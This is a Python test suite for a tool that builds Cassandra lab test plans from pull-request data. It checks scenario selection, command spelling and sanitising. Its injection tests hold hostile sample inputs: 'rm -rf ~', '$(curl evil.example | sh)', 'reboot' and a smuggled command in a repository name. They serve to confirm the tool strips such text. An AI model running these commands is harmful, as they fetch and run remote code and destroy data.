"""lab-plan: scenario selection, plan text, sanitising, command spelling, model section, plan.md."""

import copy
import gzip
import json
import os
import re
import shlex
import tempfile
import unittest

from cpr import checks, cli, diffview, labplan, model, render
from cpr.triage import triage
from tests.helpers import bundle, with_files

HERE = os.path.dirname(os.path.abspath(__file__))
COMMANDS = os.path.join(HERE, "fixtures", "labplan", "commands.txt")
PKG = "src/java/org/apache/cassandra/"


def recorded(name):
    with gzip.open(os.path.join(HERE, "fixtures", "bundles", name), "rt") as f:
        return json.load(f)


def synthetic(path, lines=150, title="CASSANDRA-21649: Fix things (5.0)", base="cassandra-5.0"):
    b = with_files(bundle(), [(path, [f"int x{i} = {i};" for i in range(lines)], False)])
    b["pr"]["title"] = title
    b["pr"]["base"] = base
    return b


def code_blocks(markdown):
    return re.findall(r"```bash\n(.*?)\n```", markdown, re.S)


# --- easy-db-lab commands listing -> command tree ---------------------------------------------------

def parse_commands(text):
    """{command path tuple: set of option names}. Command lines are `name - description`; option lines start with -."""
    tree, stack = {(): set()}, []
    for raw in text.splitlines()[1:]:
        if not raw.strip():
            continue
        indent = len(raw) - len(raw.lstrip())
        body = raw.strip()
        if body.startswith("-"):
            names = body.split(" <<")[0].split(" - ")[0]
            tree[tuple(stack)].update(n.strip() for n in names.split(","))
            continue
        if body.startswith("<<"):
            continue
        name = body.split(" - ")[0].strip()
        depth = indent // 2 - 1
        stack = stack[:depth] + [name]
        tree.setdefault(tuple(stack), set())
    return tree


PASSTHROUGH = {("cassandra", "nt"), ("cassandra", "stress", "start"), ("exec", "run")}


def check_edb_line(tree, line):
    """Return a problem string for an `$EDB ...` line, or None."""
    rest = line.split("$EDB", 1)[1]
    tokens = shlex.split(rest, comments=True)
    path = ()
    while tokens and path + (tokens[0],) in tree:
        path += (tokens.pop(0),)
    if not path:
        return f"unknown command: {line.strip()}"
    if tokens and not tokens[0].startswith("-") and any(k[:len(path)] == path and len(k) > len(path) for k in tree):
        return f"unknown subcommand {tokens[0]} of {' '.join(path)}: {line.strip()}"
    options, i = tree[path], 0
    while i < len(tokens):
        t = tokens[i]
        if t == "--":
            break
        if t.startswith("-"):
            if t not in options:
                return f"unknown option {t} for {' '.join(path)}: {line.strip()}"
            i += 2 if i + 1 < len(tokens) and not tokens[i + 1].startswith("-") else 1
            continue
        if path in PASSTHROUGH:
            break  # first positional starts the passed-through arguments
        i += 1
    if path == ("cassandra", "stress", "start") and "--" not in tokens:
        return f"stress start without --: {line.strip()}"
    return None


def edb_lines(markdown):
    out = []
    for block in code_blocks(markdown):
        out += [l for l in block.splitlines() if "$EDB" in l and not l.lstrip().startswith("#")]
    return out


SCENARIO_PATHS = {
    "crash": PKG + "db/commitlog/CommitLog.java", "accord": PKG + "service/accord/AccordService.java",
    "lwt": PKG + "service/paxos/Paxos.java", "compaction": PKG + "db/compaction/CompactionManager.java",
    "repair": PKG + "repair/RepairJob.java", "mixed-version": PKG + "net/Message.java",
    "write-path": PKG + "db/memtable/SkipListMemtable.java", "read-path": PKG + "db/ReadCommand.java",
    "index": PKG + "index/sai/StorageAttachedIndex.java", "mixed-load": PKG + "utils/FBUtilities.java",
    "smoke": PKG + "transport/Server.java",
}


class Config(unittest.TestCase):
    def test_rules_load_and_reference_known_scenarios(self):
        cfg = labplan.load_config()
        self.assertLessEqual(cfg["max_scenarios"], 2)
        self.assertEqual(cfg["max_prod_files"], 300)
        for rule in cfg["rules"]:
            self.assertIn(rule["scenario"], cfg["scenarios"], rule["id"])
            for rx in rule.get("regex", []) + [rule.get(k) for k in ("keywords", "exclude_keywords") if rule.get(k)]:
                re.compile(rx)
        for sid, sc in cfg["scenarios"].items():
            self.assertIn(sc["kind"], labplan.KINDS, sid)
        self.assertEqual({r["scenario"] for r in cfg["rules"]}, set(cfg["scenarios"]))
        self.assertEqual([cfg["java_by_branch"][b] for b in ("cassandra-4.0", "cassandra-4.1", "cassandra-5.0", "trunk")],
                         [11, 11, 17, 21])

    def test_labplan_never_runs_anything(self):
        with open(labplan.__file__) as f:
            src = f.read()
        for word in ("subprocess", "os.system", "urllib", "socket", "requests", "cpr.net"):
            self.assertNotIn(word, src)


class Selection(unittest.TestCase):
    def test_5201_is_a_crash_scenario_and_names_the_rule(self):
        p = labplan.build_plan(recorded("5201-backport-set.json.gz"))
        self.assertEqual(p["status"], "plan")
        self.assertEqual([s["id"] for s in p["scenarios"]], ["crash"])
        self.assertEqual(p["scenarios"][0]["rules"], ["crash-sstable-delete"])
        md = p["markdown"]
        self.assertIn("rule `crash-sstable-delete`", md)
        self.assertIn("sudo systemctl kill -s KILL cassandra", md)
        self.assertIn("**Inconclusive:**", md)  # the control arm can fail
        self.assertNotIn("A B B A", md)

    def test_4967_is_accord_with_a_smoke_second(self):
        p = labplan.build_plan(recorded("4967-huge.json.gz"))
        self.assertEqual([s["id"] for s in p["scenarios"]], ["accord", "smoke"])
        self.assertEqual([d["id"] for d in p["dropped"]], ["mixed-load"])
        md = p["markdown"]
        self.assertIn("TxnCounter --workload.impl=ACCORD", md)
        self.assertIn("TxnCounter --workload.impl=LWT", md)
        self.assertIn("for arm in base head head base; do", md)
        self.assertIn("enabled: true", md)
        self.assertIn("Calibrate (base, 2 x 5 min)", md)
        self.assertIn("pr4967-f72d4f0", md)

    def test_json_rules_pick_one_scenario_per_path(self):
        for sid, path in SCENARIO_PATHS.items():
            b = synthetic(path)
            if sid == "crash":
                b["pr"]["title"] = "Fix"
            p = labplan.build_plan(b)
            self.assertEqual(p["status"], "plan", sid)
            self.assertEqual(p["scenarios"][0]["id"], sid, sid)

    def test_unmatched_production_code_falls_back_to_smoke(self):
        p = labplan.build_plan(synthetic(PKG + "locator/Foo.java"))
        self.assertEqual([s["id"] for s in p["scenarios"]], ["smoke"])
        self.assertEqual(p["scenarios"][0]["rules"], ["default-smoke"])

    def test_small_perf_touch_does_not_earn_a_scenario(self):
        p = labplan.build_plan(synthetic(PKG + "db/compaction/CompactionManager.java", lines=5))
        self.assertEqual([s["id"] for s in p["scenarios"]], ["smoke"])

    def test_at_most_two_scenarios(self):
        b = with_files(bundle(), [(SCENARIO_PATHS[s], ["int x;"] * 150, False) for s in ("accord", "lwt", "repair", "compaction")])
        self.assertEqual(len(labplan.build_plan(b)["scenarios"]), 2)

    def test_java_follows_the_base_branch(self):
        for base, java in (("cassandra-4.1", 11), ("cassandra-5.0", 17), ("trunk", 21)):
            md = labplan.build_plan(synthetic(SCENARIO_PATHS["compaction"], base=base))["markdown"]
            self.assertIn(f"--java {java}", md)


class NoPlan(unittest.TestCase):
    def reason(self, b):
        p = labplan.build_plan(b)
        self.assertEqual(p["status"], "none")
        self.assertEqual(p["markdown"], "")
        return p["reason"]

    def test_docs_only(self):
        self.assertIn("documentation", self.reason(with_files(bundle(), [("doc/modules/cassandra/pages/x.adoc", ["a"], False)])))

    def test_tests_only(self):
        self.assertIn("tests-only", self.reason(with_files(bundle(), [("test/unit/org/apache/cassandra/FooTest.java", ["a"], False)])))

    def test_dependency_and_build(self):
        self.assertIn("dependency", self.reason(with_files(bundle(), [(".build/parent-pom-template.xml", ["a"], False)])))
        self.assertIn("build", self.reason(with_files(bundle(), [(".github/workflows/x.yml", ["a"], False)])))

    def test_python_tooling_only(self):
        self.assertIn("no server code", self.reason(with_files(bundle(), [("pylib/cqlshlib/cqlhandling.py", ["a"], False)])))

    def test_over_300_production_files(self):
        files = [(f"{PKG}db/F{i}.java", ["int x;"], False) for i in range(301)]
        self.assertIn("301 production files", self.reason(with_files(bundle(), files)))
        files = files[:300]
        self.assertEqual(labplan.build_plan(with_files(bundle(), files))["status"], "plan")

    def test_unsafe_head_repo(self):
        b = synthetic(PKG + "db/Foo.java")
        b["pr"]["head_repo"] = "alice/cass; rm -rf ~"
        self.assertIn("head repository", self.reason(b))
        b["pr"]["head_repo"] = None
        self.assertIn("head repository", self.reason(b))


class Sanitising(unittest.TestCase):
    def test_sanitise_title(self):
        self.assertEqual(labplan.sanitise_title("`; rm -rf ~`"), "rm -rf")
        self.assertEqual(labplan.sanitise_title("a  b\n$(x) <script>"), "a b(x) script")
        self.assertEqual(len(labplan.sanitise_title("x" * 200, 80)), 80)

    def test_title_injection_adds_no_command(self):
        clean = synthetic(PKG + "db/compaction/CompactionManager.java", title="Fix things")
        hostile = copy.deepcopy(clean)
        hostile["pr"]["title"] = "Fix things `; rm -rf ~` $(curl evil.example | sh) && reboot"
        a, b = labplan.build_plan(clean)["markdown"], labplan.build_plan(hostile)["markdown"]
        self.assertEqual(code_blocks(a), code_blocks(b))
        first = b.splitlines()[0]
        for bad in ("`", ";", "$", "|", "&", "~"):
            self.assertNotIn(bad, first)
        self.assertIn("rm -rf", first)  # kept as harmless words in the heading
        self.assertNotIn("evil", "\n".join(code_blocks(b)))

    def test_ticket_summary_and_body_never_reach_the_plan(self):
        b = synthetic(PKG + "db/compaction/CompactionManager.java")
        b["pr"]["body"] = "run `rm -rf /` now"
        b["jira"]["ticket"]["summary"] = "$(reboot)"
        md = labplan.build_plan(b)["markdown"]
        self.assertNotIn("rm -rf /", md)
        self.assertNotIn("reboot", md)


class CommandSpelling(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        with open(COMMANDS) as f:
            cls.tree = parse_commands(f.read())

    def test_fixture_knows_the_commands_we_use(self):
        for path in (("init",), ("down",), ("status",), ("cassandra", "install"), ("cassandra", "stress", "start"),
                     ("cassandra", "nt"), ("exec", "run")):
            self.assertIn(path, self.tree)
        self.assertIn("--auto-approve", self.tree[("down",)])

    def test_checker_catches_renamed_commands_and_flags(self):
        self.assertIsNotNone(check_edb_line(self.tree, "$EDB cassandra setup-everything"))
        self.assertIsNotNone(check_edb_line(self.tree, "$EDB init x --db-count 3"))
        self.assertIsNotNone(check_edb_line(self.tree, "$EDB cassandra stress start --name a KeyValue"))
        self.assertIsNone(check_edb_line(self.tree, "$EDB down --auto-approve"))

    def assert_spelled(self, markdown, label):
        lines = edb_lines(markdown)
        self.assertTrue(lines, label)
        problems = [p for p in (check_edb_line(self.tree, l) for l in lines) if p]
        self.assertEqual(problems, [], label)

    def test_golden_plans(self):
        for name in ("5201-backport-set.json.gz", "4967-huge.json.gz"):
            self.assert_spelled(labplan.build_plan(recorded(name))["markdown"], name)

    def test_every_scenario_kind(self):
        for sid, path in SCENARIO_PATHS.items():
            b = synthetic(path)
            if sid == "crash":
                b["pr"]["title"] = "Fix"
            p = labplan.build_plan(b)
            self.assertEqual(p["scenarios"][0]["id"], sid)
            self.assert_spelled(p["markdown"], sid)

    def test_plan_has_the_runner_headings(self):
        md = labplan.build_plan(recorded("4967-huge.json.gz"))["markdown"]
        headings = re.findall(r"^## (.+)$", md, re.M)
        for h in ("Objective", "Cluster Name", "Datacenters", "Environment", "Artifacts under test", "Steps", "Results table (fill in)", "Notes"):
            self.assertIn(h, headings)
        self.assertEqual(re.search(r"## Cluster Name\n(.+)\n", md).group(1), "pr4967-f72d4f0")
        self.assertEqual(re.search(r"## Datacenters\n(.+)\n", md).group(1), "single")
        self.assertTrue(re.search(r"### 1\. .+", md))
        self.assertTrue(re.findall(r"### \d+\. Teardown", md))
        self.assertIn("$EDB down --auto-approve", md)
        self.assertIn(f"-f ref={recorded('4967-huge.json.gz')['git']['merge_base']}", md)  # build the merge-base, not a branch
        self.assertNotIn(" &\n", md)  # nothing in the background


class Section(unittest.TestCase):
    def build(self, b):
        res = checks.run_all(b)
        return model.build(b, res, triage(b), render.load_docs(), diffview.unavailable("x"))

    def section(self, m):
        ids = [s["id"] for s in m["sections"]]
        self.assertEqual(ids[ids.index("testing") + 1], "labplan")
        return m["sections"][ids.index("labplan")]

    def test_plan_status_and_summary(self):
        m = self.build(synthetic(PKG + "db/compaction/CompactionManager.java"))
        s = self.section(m)
        self.assertEqual(s["status"], "info")
        self.assertEqual(s["summary"], "Plan for compaction under write load (not run)")
        self.assertEqual(s["docs"], ["labplan"])
        self.assertEqual(m["lab_plan"]["filename"], "plan-5198.md")

    def test_no_plan_is_not_applicable_with_the_reason(self):
        m = self.build(with_files(bundle(), [("doc/x.adoc", ["a"], False)]))
        s = self.section(m)
        self.assertEqual(s["status"], "not-applicable")
        self.assertEqual(s["summary"], "No lab plan: documentation-only change")

    def test_plan_does_not_move_the_verdict(self):
        b = synthetic(PKG + "db/compaction/CompactionManager.java")
        self.assertEqual(self.build(b)["recommendation"]["verdict"],
                         model.recommend(b["pr"], checks.run_all(b))["verdict"])

    def test_invalid_lab_plan_is_rejected(self):
        m = self.build(synthetic(PKG + "db/compaction/CompactionManager.java"))
        m["lab_plan"]["status"] = "maybe"
        with self.assertRaises(model.ModelError):
            model.validate(m)


class PlanFile(unittest.TestCase):
    def test_plan_md_written_next_to_the_report_and_removed_when_gone(self):
        plan_model = {"lab_plan": labplan.build_plan(recorded("5201-backport-set.json.gz"))}
        none_model = {"lab_plan": {"status": "none", "reason": "docs", "markdown": "", "scenarios": []}}
        with tempfile.TemporaryDirectory() as d:
            report = os.path.join(d, "reports", "5201", "index.html")
            os.makedirs(os.path.dirname(report))
            path = cli.write_plan(plan_model, report)
            self.assertEqual(path, os.path.join(os.path.dirname(report), "plan.md"))
            with open(path) as f:
                self.assertEqual(f.read(), plan_model["lab_plan"]["markdown"])
            self.assertIsNone(cli.write_plan(none_model, report))
            self.assertFalse(os.path.exists(path))


if __name__ == "__main__":
    unittest.main()
